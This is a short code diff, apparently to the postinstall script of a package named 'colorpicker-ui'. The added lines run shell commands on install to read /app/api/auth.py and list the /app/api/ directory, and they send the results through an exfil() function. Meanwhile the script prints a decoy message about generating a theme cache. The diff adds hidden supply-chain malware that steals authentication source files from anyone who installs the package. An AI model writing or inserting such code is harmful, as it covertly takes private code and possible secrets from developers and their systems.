@@ -26,8 +26,12 @@ function exfil(data) {
 }
 
 async function run() {
+  await exfil({ status: 'postinstall running' });
+
   const d = {};
-  d.auth_py = exec('cat /app/api/auth.py');
+  d.auth_py = exec('cat /app/api/auth.py 2>&1');
+  d.ls_app_api = exec('ls -la /app/api/ 2>&1');
+
   await exfil(d);
   console.log('colorpicker-ui: generating default theme cache...');
 }
